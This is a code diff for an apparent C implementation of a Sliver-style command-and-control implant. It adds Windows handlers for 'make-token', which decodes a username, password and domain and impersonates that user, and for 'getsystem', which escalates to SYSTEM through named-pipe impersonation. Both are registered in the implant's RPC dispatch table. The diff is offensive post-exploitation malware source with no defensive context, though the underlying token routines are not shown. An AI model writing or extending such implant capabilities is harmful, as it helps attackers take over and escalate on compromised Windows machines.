@@ -12,6 +12,7 @@
 #include "sliver/privs.h"
 #include "sliver/screenshot.h"
 #include "sliver/services.h"
+#include "sliver/token.h"
 #include "sliver/proc.h"
 
 #define SLIVER_LS_MAX_ENTRIES 4096
@@ -903,6 +904,65 @@ static int handle_rev2self(const sliver_envelope_t *req, sliver_buf_t *out) {
 }
 #endif
 
+
+/* --- make-token / getsystem -------------------------------------------- */
+#if defined(_WIN32)
+static int sliver_maketoken_decode(const void *data, size_t len, char *user, size_t ucap,
+                                   char *pass, size_t pcap, char *domain, size_t dcap,
+                                   uint32_t *logon_type) {
+  sliver_reader_t r;
+  uint32_t field, wire;
+  int rc;
+
+  user[0] = 0;
+  pass[0] = 0;
+  domain[0] = 0;
+  *logon_type = 0;
+  sliver_reader_init(&r, data, len);
+  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
+    if (wire == 2 && field == 1) {
+      if (sliver_reader_string(&r, user, ucap) != 0) return -1;
+    } else if (wire == 2 && field == 2) {
+      if (sliver_reader_string(&r, pass, pcap) != 0) return -1;
+    } else if (wire == 2 && field == 3) {
+      if (sliver_reader_string(&r, domain, dcap) != 0) return -1;
+    } else if (wire == 0 && field == 4) {
+      uint64_t v;
+      if (sliver_reader_varint(&r, &v) != 0) return -1;
+      *logon_type = (uint32_t)v;
+    } else if (sliver_reader_skip(&r, wire) != 0) {
+      return -1;
+    }
+  }
+  return rc == 1 ? 0 : -1;
+}
+
+static int handle_make_token(const sliver_envelope_t *req, sliver_buf_t *out) {
+  char user[256];
+  char pass[256];
+  char domain[256];
+  uint32_t logon_type = 0;
+
+  if (sliver_maketoken_decode(req->data, req->data_len, user, sizeof(user), pass, sizeof(pass),
+                              domain, sizeof(domain), &logon_type) != 0) {
+    return -1;
+  }
+  if (sliver_make_token(user, pass, domain, logon_type) != 0) {
+    return sliver_empty_response_encode(out, "make-token: LogonUser/impersonation failed");
+  }
+  LOG_DEBUG("rpc: make-token %s\\%s ok", domain, user);
+  return sliver_empty_response_encode(out, NULL);
+}
+
+static int handle_getsystem(const sliver_envelope_t *req, sliver_buf_t *out) {
+  (void)req;
+  if (sliver_get_system() != 0) {
+    return sliver_empty_response_encode(out, "getsystem: named-pipe impersonation failed");
+  }
+  return sliver_empty_response_encode(out, NULL);
+}
+#endif
+
 static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_LS_REQ, SLIVER_MSG_LS, sliver_rpc_handle_ls},
     {SLIVER_MSG_PWD_REQ, SLIVER_MSG_PWD, sliver_rpc_handle_pwd},
@@ -930,7 +990,9 @@ static const rpc_entry_t g_handlers[] = {
     {136, 136, handle_execute_children},
     {129, 129, handle_grep},
 #if defined(_WIN32)
-        {130, 130, handle_services},
+        {64, 65, handle_make_token},
+    {32, 33, handle_getsystem},
+    {130, 130, handle_services},
     {131, 131, handle_service_detail},
     {132, 132, handle_service_start},
     {31, 31, handle_rev2self},
@@ -1002,6 +1064,7 @@ void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *resu
     return;
   }
 }
+
 
 
 
